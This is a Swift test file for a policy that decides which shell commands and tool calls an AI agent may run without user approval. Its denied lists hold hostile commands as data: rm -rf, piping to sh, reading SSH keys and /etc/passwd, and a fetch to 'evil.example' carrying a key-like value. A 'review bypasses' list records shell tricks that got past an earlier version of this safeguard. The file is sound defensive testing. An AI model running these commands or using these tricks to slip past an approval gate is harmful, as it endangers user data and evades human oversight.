@testable import HmuxChief
import Foundation
import Testing

@Suite struct ChiefToolPolicyTests {
    // MARK: Auto-allowed

    static let allowed: [String] = [
        // Saving a fact is visible in the transcript ("Chief will remember · Undo").
        "hmux chief memory add \"Uses worktrees under ~/src\"",
        "hmux chief memory add fact",
        // hmux reads (deny by default: only hmuxReadOnlyCommands)
        "hmux list-workspaces",
        "hmux tree --all",
        "hmux workspace list --json",
        "hmux current --json",
        "hmux identify --json",
        "hmux read-screen --workspace workspace:2 --lines 80",
        "hmux read-selection --workspace workspace:2",
        "hmux sidebar-state --workspace workspace:2",
        "hmux list-status --workspace workspace:2",
        "hmux list-notifications",
        "hmux list-log --limit 20",
        "hmux top --all",
        "hmux memory --all",
        "hmux version",
        "hmux help agents",
        "hmux docs shortcuts",
        "hmux settings path",
        "hmux config get terminal.scrollSpeed",
        "hmux todo list --workspace workspace:2",
        "hmux vm ls --json",
        "hmux vm status brave-otter",
        "hmux vm tree brave-otter --json",
        "hmux cloud ls --json",
        "hmux vm terminal read brave-otter term_1",
        "hmux vm terminal wait brave-otter term_1 --pattern Working --timeout 60",
        "hmux vm wait brave-otter",
        "hmux vm wait brave-otter --timeout 300",
        "hmux chief status --json",
        "hmux chief read --limit 5",
        "hmux chief conversations",
        "hmux chief memory list",
        "hmux list-workspaces | sort -nr -k2 | head",
        "hmux list-workspaces | sort -t: -k 2,2n --reverse",
        "git log HEAD~3 --oneline",
        // workspace create without a command (the lead's call: one card only when it runs something)
        "hmux workspace create --name Build",
        "hmux workspace create --name Build --cwd /Users/me/src/app --description 'API work' --json",
        "hmux workspace create --name=Build --focus false",
        "hmux workspace create --name Build --no-focus --group group:1",
        // the dogfood command that used to ask
        "hmux tree --all 2>&1 | head -100",
        "hmux tree --all 2>/dev/null | head -100",
        "hmux tree --all 2> /dev/null",
        "hmux tree --all >/dev/null 2>&1",
        "hmux workspace list --json | jq '.workspaces | length'",
        "hmux workspace list --json | jq -r '.workspaces[] | \"\\(.ref) \\(.title)\"'",
        "hmux tree --all | grep -c workspace",
        "hmux tree --all | rg -i agent | sort | uniq -c",
        "hmux list-workspaces | wc -l",
        "hmux list-workspaces | cut -d' ' -f1 | tr a-z A-Z | column -t",
        "hmux list-workspaces | awk '{print $1}'",
        "hmux list-workspaces | awk -F: 'NR==1 {print $2}'",
        "hmux list-workspaces | sed -n '1,5p'",
        "hmux list-workspaces | sed -n -e 's/workspace/ws/gp'",
        "hmux list-workspaces | sed -nE '/agent/p'",
        "hmux list-workspaces | sort -r | tail -3",
        // chained reads
        "hmux workspace list --json && hmux vm ls --json",
        "hmux tree --all; hmux current --json",
        "hmux tree --all\nhmux current --json",
        "hmux tree --all || hmux list-workspaces",
        "hmux tree;",
        // git and gh reads
        "git status",
        "git log --oneline -5",
        "git -C /tmp/repo status --short",
        "git --no-pager diff --stat",
        "git branch",
        "git branch -a",
        "git branch -vv",
        "git branch --show-current",
        "git branch --list 'feat/*'",
        "git branch --contains HEAD",
        "git remote -v",
        "git remote get-url origin",
        "git worktree list",
        "git stash list",
        "git tag",
        "git tag -l 'v1.*'",
        "git config --get user.email",
        "git rev-parse --abbrev-ref HEAD",
        "git log --oneline | head -3",
        "gh pr view 123",
        "gh pr checks 123",
        "gh issue list",
        "gh run list --limit 5",
        "gh pr list --json number,title | jq length",
        // plain read-only tools
        "ls /Users/tester/src/app",
        "pwd",
        "date",
        "which hmux",
        "cat README.md | head -20",
        "grep -rn TODO Sources | wc -l",
        "rg -l ChiefToolPolicy /Users/tester/src/app",
        // shell wrappers (Claude and Codex)
        "/bin/zsh -lc 'hmux tree --json'",
        "/bin/zsh -lc 'hmux tree --all 2>&1 | head -100'",
        "bash -c \"hmux workspace list --json | jq '.workspaces | length'\"",
        "/bin/zsh -lc 'hmux list-workspaces | awk '\"'\"'{print $1}'\"'\"''",
    ]

    // MARK: Asks first

    static let denied: [String] = [
        "",
        "   ",
        // hmux writes ask now (deny by default)
        "hmux notify --title hi",
        "hmux workspace create --name Build --cwd ~/src/app --command 'codex --yolo'",
        "hmux workspace create --name Build --command 'codex --yolo'",
        "hmux workspace create --name Build --command=id",
        "hmux workspace create --name Build --layout '{}'",
        "hmux workspace create --name Build --focus true",
        "hmux workspace create --name Build --focus",
        "hmux workspace create --name --command x",
        "hmux workspace create --name close",
        "hmux workspace create Build",
        "hmux new-workspace --name Build",
        // machine creation costs money; dispatch is one meaningful card
        "hmux vm new --detach",
        // `--wake` starts a stopped machine, which bills the user
        "hmux vm wait brave-otter --wake",
        "hmux vm wait brave-otter --timeout 300 --wake",
        "hmux cloud wait brave-otter --WAKE",
        "hmux vm wait brave-otter --wake=true",
        "hmux cloud new --size 8g",
        "hmux vm fork brave-otter",
        "hmux chief dispatch --agent codex --name fix 'fix the bug'",
        "hmux workspace rename workspace:2 --title \"API server\"",
        "hmux workspace env workspace:2",
        "hmux workspace status set auto",
        "hmux send --workspace workspace:2 --surface surface:3 \"npm test; echo done\\n\"",
        "hmux send-key --workspace workspace:2 --surface surface:3 enter",
        "hmux agent message workspace:2 \"please close the PR when done\"",
        "hmux agent inbox --mark-read",
        "hmux chief memory forget 3",
        "hmux config set app.theme dark",
        "hmux --json tree",
        "hmux tree-x",
        // destructive hmux verbs
        "hmux close-workspace --workspace workspace:2",
        "hmux workspace close workspace:2",
        "hmux close-surface --surface surface:3",
        "hmux close-window --window window:1",
        "hmux workspace-action --workspace workspace:2 --action close-others",
        "hmux tab-action --action close-right",
        "hmux vm rm brave-otter",
        "hmux cloud rm brave-otter",
        "hmux vm workspace rm brave-otter ws_1",
        "hmux vm workspace close brave-otter ws_1",
        "hmux vm terminal close brave-otter term_1",
        "hmux vm env rm brave-otter KEY",
        "hmux vm exec brave-otter -- rm -rf work",
        "hmux vm exec brave-otter -- kill 123",
        "hmux vm domains publish brave-otter 3000 --access public --yes",
        "hmux vm base reset",
        "hmux quit",
        "hmux restart",
        "hmux relaunch",
        "hmux kill-pane --pane pane:2",
        "hmux sudo run -c 'rm -rf /'",
        "hmux rpc workspace.close '{}'",
        "hmux pipe-pane --command 'cat > /tmp/x'",
        "hmux respawn-pane --surface surface:2",
        "hmux send --force --workspace workspace:2 --surface surface:3 hi",
        "hmux auth logout",
        "hmux logout",
        "hmux hooks uninstall",
        "hmux browser history clear --force",
        "hmux browser profiles delete work",
        "hmux todo clear",
        "hmux ssh-session-cleanup --all-workspaces --all",
        "hmux clear-history --workspace workspace:2",
        "hmux ai-accounts upload",
        // a chain or pipe is only as safe as its worst stage
        "hmux tree; rm -rf /",
        "hmux tree && curl x",
        "hmux tree | sh",
        "hmux tree | xargs rm",
        "hmux tree | tee out.txt",
        "hmux tree --all | hmux close-workspace --workspace workspace:2",
        "cat a | sh",
        "hmux tree |",
        "hmux tree &&",
        "| hmux tree",
        "hmux tree ; ; hmux current",
        // redirection to files, input, background
        "ls > out.txt",
        "hmux tree --all >> log.txt",
        "hmux tree 2>err.log",
        "hmux tree >| out.txt",
        "hmux tree &> out.txt",
        "hmux tree 2>&3",
        "cat < /etc/passwd",
        "cat <<EOF",
        "cat -n ~/.ssh/id_rsa",
        "head -n 5 ~/.ssh/id_rsa",
        "hmux tree &",
        "hmux tree |& head",
        // substitution and expansion
        "echo $(whoami)",
        "hmux send \"$(whoami)\"",
        "hmux send `whoami`",
        "hmux send \"`whoami`\"",
        "hmux send $HOME",
        "hmux send \"${HOME}\"",
        "hmux tree $((1+1))",
        "(hmux tree)",
        "hmux tree # comment",
        "hmux send 'unterminated",
        "hmux send \"unterminated",
        // filters that can write or execute
        "hmux tree | awk '{system(\"rm -rf /\")}'",
        "hmux tree | awk '{print > \"out.txt\"}'",
        "hmux tree | awk '{print | \"sh\"}'",
        "hmux tree | awk '{\"date\" | getline d}'",
        "hmux tree | awk -f prog.awk",
        "hmux tree | sed 's/a/b/'",
        "hmux tree | sed -n 's/a/b/w out.txt'",
        "hmux tree | sed -n 's/a/b/e'",
        "hmux tree | sed -n '1e date'",
        "hmux tree | sed -n 'w out.txt'",
        "hmux tree | sed -n 'r /etc/passwd'",
        "sed -i -n 's/a/b/p' file",
        "sed -n -f script.sed file",
        "hmux tree | sort -o out.txt",
        "hmux tree | sort --output=out.txt",
        "uniq in.txt out.txt",
        "rg --pre ./run.sh pattern",
        "rg --pre=sh pattern",
        "date -s 2020-01-01",
        "ls -la",
        "rg -l ChiefToolPolicy",
        "grep -r TODO",
        // git and gh that change things
        "git push origin main",
        "git commit -m x",
        "git -c core.pager=sh log",
        "git branch new-feature",
        "git branch -D old",
        "git branch -m new-name",
        "git branch --set-upstream-to=origin/main",
        "git tag v1.0",
        "git tag -d v1.0",
        "git remote add evil https://x",
        "git remote remove origin",
        "git worktree remove ../wt",
        "git stash pop",
        "git config user.email x@y",
        "git config --unset user.email",
        "git diff --output=/tmp/x",
        "gh pr merge 12",
        "gh pr create",
        "gh api repos/x/y -X DELETE",
        "gh",
        // other programs and lookalikes
        "/tmp/evil/hmux tree",
        "./hmux tree",
        "HMUX_SOCKET_PATH=/x hmux tree",
        "rm -rf build",
        "make",
        "curl https://example.com",
        "echo hi",
        "env hmux tree",
        "/bin/zsh -lc 'rm -rf /'",
        "/bin/zsh -lc 'hmux tree' extra",
        "/bin/zsh -lc \"hmux send `whoami`\"",
    ]

    // MARK: Review bypasses (PR 21063)

    /// Each of these got past an earlier version of the policy.
    static let reviewBypasses: [String] = [
        // 1. `$'…'` / `$"…"` quoting rewrites the word after the checks.
        "rg $'--pre=bash' x .",
        "awk $'BEGIN{sys\\x74em(\"id\")}'",
        "sort $'--output=~/.zshenv'",
        "hmux $'close-workspace' --workspace workspace:2",
        "hmux tree $\"--force\"",
        "hmux \"$'close-workspace'\"",
        // 2. Brace expansion, globs and tilde expansion.
        "rg {--pre=bash,} x .",
        "sort {--output=out.txt,} f",
        "hmux clo{s,}e-workspace --workspace workspace:2",
        "git diff {--output=/tmp/x,}",
        "hmux tree --a*",
        "hmux list-workspace?",
        "hmux list-workspace[s]",
        "rg ^x",
        "ls ~",
        "ls ~/.ssh",
        "git diff --output=~/x",
        "cat =hmux",
        // 3. GNU sort long-option abbreviations and other flags.
        "hmux tree | sort --out=/tmp/x",
        "hmux tree | sort --outp=/tmp/x",
        "hmux tree | sort --compress-prog=sh",
        "hmux tree | sort --compress=sh",
        "hmux tree | sort -T /tmp",
        "hmux tree | sort -o x",
        "hmux tree | sort -no x",
        "hmux tree | sort --files0-from=list",
        "hmux tree | sort --random-source=/dev/urandom",
        // git long-option abbreviations
        "git diff --outp=/tmp/x",
        "git log --outpu=/tmp/x",
        // 4. hmux verbs that make approvals a formality.
        "hmux send --workspace workspace:2 \"rm -rf ~\\n\"",
        "hmux send-key --workspace workspace:2 enter",
        "hmux send-panel --panel panel:1 hi",
        "hmux paste --submit hi",
        "hmux new-workspace --command 'rm -rf ~'",
        "hmux new-split right --command id",
        "hmux new-pane --command id",
        "hmux vm exec brave-otter -- id",
        "hmux vm run brave-otter id",
        "hmux vm terminal send brave-otter term_1 id --keys enter",
        "hmux browser eval 'document.cookie'",
        "hmux browser --surface surface:2 eval 1",
        "hmux chief approve",
        "hmux chief answer --choice '4 GB'",
        "hmux chief send hi",
        "hmux tree --force=true",
        "hmux list-workspaces --yes=1",
        "hmux read-screen --workspace workspace:2 close-workspace",
        "hmux events",
        "hmux set-status k v",
        "hmux hooks setup",
        // 5. tool-level reads are covered in claudeReadsAvoidCredentials.
    ]

    @Test(arguments: reviewBypasses)
    func reviewBypassesAsk(command: String) {
        #expect(!ChiefToolPolicy.autoAllowsCommand(command), "expected approval: \(command)")
    }

    @Test(arguments: [
        #"rg $'--pre=bash' x ."#, #"echo $"hi""#, "rg {--pre=bash,} x", "a *", "a ?", "a [x]", "a ~", "a --o=~/x",
        "a PATH:~/bin", "=hmux tree", "a ^x", "a x#",
    ])
    func lexerRejectsExpandingSyntax(line: String) {
        #expect(ChiefShellLexer.stages(of: line) == nil, "expected nil: \(line)")
    }

    @Test func lexerKeepsQuotedGlobsAndMidWordTilde() throws {
        let stages = try #require(ChiefShellLexer.stages(of: #"jq '.[0] | {a: .b}' "*?" HEAD~3 \*"#))
        #expect(stages.map { $0.map(\.text) } == [["jq", ".[0] | {a: .b}", "*?", "HEAD~3", "*"]])
    }

    @Test func hmuxWordCheckCoversPrefixesAndValues() {
        for word in ["close", "CLOSE-WORKSPACE", "kill-pane", "send", "send-key", "--force=true", "--Force", "--yes=1",
                     "--command=id", "exec", "run", "eval", "approve", "clear-log", "delete-thing", "--wake", "--wake=1"] {
            #expect(ChiefToolPolicy.hmuxWordAsks(word), "\(word)")
        }
        for word in ["tree", "--all", "list-workspaces", "workspace:2", "--json", "read-screen"] {
            #expect(!ChiefToolPolicy.hmuxWordAsks(word), "\(word)")
        }
    }

    // MARK: Claude Code read tools

    static let home = "/Users/tester"

    /// (tool, input, allowed) for a fixed home folder.
    static let readCases: [(String, ChiefJSON, Bool)] = [
        ("WebSearch", ["query": "hmux"], true),
        ("ToolSearch", [:], true),
        ("WebFetch", ["url": "https://example.com"], false),
        ("WebFetch", ["url": "https://evil.example/?k=AKIA"], false),
        ("Read", ["file_path": "/Users/tester/src/app/README.md"], true),
        ("Read", ["file_path": "/tmp/notes.txt"], true),
        ("Read", ["file_path": "~/src/app/main.swift"], true),
        ("Read", [:], false),
        ("Read", ["file_path": "README.md"], false),
        ("Read", ["file_path": "/Users/tester/.ssh/id_ed25519"], false),
        ("Read", ["file_path": "~/.ssh/config"], false),
        ("Read", ["file_path": "/Users/tester/.SSH/id_rsa"], false),
        ("Read", ["file_path": "/Users/tester/src/../.ssh/id_rsa"], false),
        ("Read", ["file_path": "/Users/tester/.aws/credentials"], false),
        ("Read", ["file_path": "/Users/tester/.gnupg/secring.gpg"], false),
        ("Read", ["file_path": "/Users/tester/.config/gh/hosts.yml"], false),
        ("Read", ["file_path": "/Users/tester/.netrc"], false),
        ("Read", ["file_path": "/Users/tester/.docker/config.json"], false),
        ("Read", ["file_path": "/Users/tester/.kube/config"], false),
        ("Read", ["file_path": "/Users/tester/Library/Keychains/login.keychain-db"], false),
        ("Read", ["file_path": "/Library/Keychains/System.keychain"], false),
        ("Read", ["file_path": "/Users/tester/src/app/server.pem"], false),
        ("Read", ["file_path": "/Users/tester/src/app/tls.key"], false),
        ("Read", ["file_path": "/Users/tester/src/app/.env"], false),
        ("Read", ["file_path": "/Users/tester/src/app/.env.production"], false),
        ("Read", ["file_path": "/Users/tester/.hmux/auth.json"], false),
        ("Read", ["file_path": "/Users/tester/.hmux/cloud/auth-token"], false),
        ("Read", ["file_path": "/Users/tester/.hmux/chief/memory/facts.jsonl"], true),
        ("Read", ["file_path": "/Users/tester/Library/Application Support/Google/Chrome/Default/Cookies"], false),
        ("Read", ["file_path": "/Users/tester/Library/Application Support/Arc/User Data/Default/Login Data"], false),
        ("Read", ["file_path": "/Users/tester/Library/Application Support/Other/Cookies"], false),
        ("Grep", ["pattern": "TODO", "path": "/Users/tester/src/app"], true),
        ("Grep", ["pattern": "TODO"], false),
        ("Grep", ["pattern": "BEGIN", "path": "/Users/tester"], false),
        ("Grep", ["pattern": "BEGIN", "path": "~"], false),
        ("Grep", ["pattern": "BEGIN", "path": "/"], false),
        ("Grep", ["pattern": "BEGIN", "path": "/Users"], false),
        ("Grep", ["pattern": "BEGIN", "path": "/Users/tester/Library"], false),
        ("Grep", ["pattern": "BEGIN", "path": "/Users/tester/.config"], false),
        ("Grep", ["pattern": "token", "path": "/Users/tester/.hmux"], false),
        ("Grep", ["pattern": "x", "path": "/Users/tester/.ssh"], false),
        ("Grep", ["pattern": "x", "path": "/Users/tester/src/app", "glob": "**/.env*"], false),
        ("Grep", ["pattern": "x", "path": "/Users/tester/src/app", "glob": "*.swift"], true),
        ("Glob", ["pattern": "**/*.swift", "path": "/Users/tester/src/app"], true),
        ("Glob", ["pattern": "**/*.pem", "path": "/Users/tester/src/app"], false),
        ("Glob", ["pattern": "**/*.swift"], false),
        ("Glob", ["pattern": "*", "path": "/Users/tester"], false),
        ("Write", ["file_path": "/tmp/x"], false),
    ]

    @Test(arguments: readCases.indices)
    func claudeReadsAvoidCredentials(index: Int) {
        let (tool, input, allowed) = Self.readCases[index]
        #expect(ChiefToolPolicy.autoAllowsClaudeTool(tool, input: input, home: Self.home) == allowed,
                "\(tool) \(input.compactText) expected \(allowed ? "allow" : "ask")")
    }

    @Test func aSymlinkToCredentialsAsks() throws {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent("chief-policy-\(UUID().uuidString)")
        let home = root.appendingPathComponent("home")
        try FileManager.default.createDirectory(at: home.appendingPathComponent(".ssh"), withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: root) }
        let key = home.appendingPathComponent(".ssh/id_rsa")
        try Data("k".utf8).write(to: key)
        let link = root.appendingPathComponent("innocent.txt")
        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: key)
        #expect(!ChiefToolPolicy.autoAllowsClaudeTool("Read", input: ["file_path": .string(link.path)], home: home.path))
        let plain = root.appendingPathComponent("plain.txt")
        try Data("p".utf8).write(to: plain)
        #expect(ChiefToolPolicy.autoAllowsClaudeTool("Read", input: ["file_path": .string(plain.path)], home: home.path))
    }

    @Test func shellReadersResolveRelativeCredentialPaths() throws {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent("chief-shell-policy-\(UUID().uuidString)")
        let home = root.appendingPathComponent("home")
        let gh = home.appendingPathComponent(".config/gh")
        try FileManager.default.createDirectory(at: gh, withIntermediateDirectories: true)
        try Data("token".utf8).write(to: gh.appendingPathComponent("hosts.yml"))
        let link = home.appendingPathComponent("public.txt")
        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: gh.appendingPathComponent("hosts.yml"))
        defer { try? FileManager.default.removeItem(at: root) }

        for command in [
            "cat README.md", "jq . README.md", "grep token README.md", "cut -d: -f1 README.md",
            "tr a-z A-Z", "column -t README.md", "rg token README.md", "sort README.md",
            "uniq README.md", "awk '{print}' README.md", "sed -n 'p' README.md",
        ] {
            #expect(ChiefToolPolicy.autoAllowsCommand(command, home: home.path), "expected allow: \(command)")
        }
        for command in [
            "cat .config/gh/hosts.yml", "jq . .config/gh/hosts.yml", "grep token .config/gh/hosts.yml",
            "cut -d: -f1 .config/gh/hosts.yml", "column -t .config/gh/hosts.yml",
            "rg token .config/gh/hosts.yml", "sort .config/gh/hosts.yml", "uniq .config/gh/hosts.yml",
            "awk '{print}' .config/gh/hosts.yml", "sed -n 'p' .config/gh/hosts.yml",
            "ls .config/gh", "cat public.txt", "cat -- .config/gh/hosts.yml",
        ] {
            #expect(!ChiefToolPolicy.autoAllowsCommand(command, home: home.path), "expected approval: \(command)")
        }
    }

    @Test func searchReadersRequireSafeRootsUnlessTheyFilterPipeInput() {
        #expect(!ChiefToolPolicy.autoAllowsCommand("ls -la", home: Self.home))
        #expect(!ChiefToolPolicy.autoAllowsCommand("rg -l ChiefToolPolicy", home: Self.home))
        #expect(!ChiefToolPolicy.autoAllowsCommand("grep -r TODO", home: Self.home))
        #expect(!ChiefToolPolicy.autoAllowsCommand("rg -R TODO /Users/tester/src/app", home: Self.home))
        #expect(ChiefToolPolicy.autoAllowsCommand("rg -l ChiefToolPolicy /Users/tester/src/app", home: Self.home))
        #expect(ChiefToolPolicy.autoAllowsCommand("grep -r TODO /Users/tester/src/app", home: Self.home))
        #expect(ChiefToolPolicy.autoAllowsCommand("hmux tree | grep -c workspace", home: Self.home))
        #expect(ChiefToolPolicy.autoAllowsCommand("hmux tree | rg -l workspace", home: Self.home))
    }

    @Test(arguments: allowed)
    func autoAllows(command: String) {
        #expect(ChiefToolPolicy.autoAllowsCommand(command), "expected auto-allow: \(command)")
    }

    @Test(arguments: denied)
    func asksFirst(command: String) {
        #expect(!ChiefToolPolicy.autoAllowsCommand(command), "expected approval: \(command)")
    }

    @Test func lexerSplitsStagesAndDropsHarmlessRedirects() throws {
        let stages = try #require(ChiefShellLexer.stages(of: "hmux tree --all 2>&1 | head -100"))
        #expect(stages.map { $0.map(\.text) } == [["hmux", "tree", "--all"], ["head", "-100"]])
        let quoted = try #require(ChiefShellLexer.stages(of: #"hmux send "a; b | c" 'd && e'"#))
        #expect(quoted.map { $0.map(\.text) } == [["hmux", "send", "a; b | c", "d && e"]])
        let escaped = try #require(ChiefShellLexer.stages(of: #"hmux send "cost \$5" it\'s"#))
        #expect(escaped.map { $0.map(\.text) } == [["hmux", "send", "cost $5", "it's"]])
        #expect(escaped[0].allSatisfy { !$0.expands })
        #expect(ChiefShellLexer.stages(of: "hmux send $HOME")?[0][2].expands == true)
    }

    @Test func unwrapsShellWrappersToOneWord() {
        #expect(ChiefToolPolicy.unwrapShell("/bin/zsh -lc 'hmux tree --json'") == "hmux tree --json")
        #expect(ChiefToolPolicy.unwrapShell("bash -c \"hmux send \\\"hi\\\"\"") == "hmux send \"hi\"")
        #expect(ChiefToolPolicy.unwrapShell("/bin/zsh -lc 'a '\"'\"'b'\"'\"''") == "a 'b'")
        #expect(ChiefToolPolicy.unwrapShell("/bin/zsh -lc 'hmux tree' extra") == "/bin/zsh -lc 'hmux tree' extra")
        #expect(ChiefToolPolicy.unwrapShell("hmux tree") == "hmux tree")
    }

    @Test func codexLegacyArgvKeepsItsScriptAsOneWord() {
        let joined = ChiefToolPolicy.shellJoin(["/bin/zsh", "-lc", "hmux tree --all 2>&1 | head -100"])
        #expect(joined == "/bin/zsh -lc 'hmux tree --all 2>&1 | head -100'")
        #expect(ChiefToolPolicy.autoAllowsCommand(joined))
        #expect(ChiefToolPolicy.shellJoin(["echo", "it's"]) == #"echo 'it'"'"'s'"#)
        #expect(!ChiefToolPolicy.autoAllowsCommand(ChiefToolPolicy.shellJoin(["/bin/zsh", "-lc", "hmux quit"])))
        #expect(!ChiefToolPolicy.autoAllowsCommand(ChiefToolPolicy.shellJoin(["/bin/zsh", "-lc", "hmux tree", "x; rm -rf /"])))
    }

    @Test func claudeBashUsesTheCommandPolicy() {
        #expect(ChiefToolPolicy.autoAllowsClaudeTool("Bash", input: ["command": "hmux tree --all 2>&1 | head -100"]))
        #expect(!ChiefToolPolicy.autoAllowsClaudeTool("Bash", input: ["command": "hmux workspace close workspace:2"]))
    }
}
